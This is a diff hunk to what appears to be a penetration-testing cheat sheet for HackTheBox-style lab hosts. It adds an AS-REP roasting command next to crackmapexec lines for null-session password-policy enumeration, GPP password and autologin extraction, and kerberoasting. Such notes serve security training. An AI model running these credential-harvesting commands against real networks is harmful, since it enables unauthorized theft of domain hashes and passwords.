@@ -669,6 +669,8 @@ crackmapexec smb 10.129.204.177  -u '' -p '' --pass-pol
 crackmapexec smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_password
 crackmapexec smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_autologin
 
+# asreproast
+crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --asreproast asreproast2.out
 # kerberoasting
 crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --kerberoasting kerberoasting.out
 # Kerberos Unconstrained Delegation
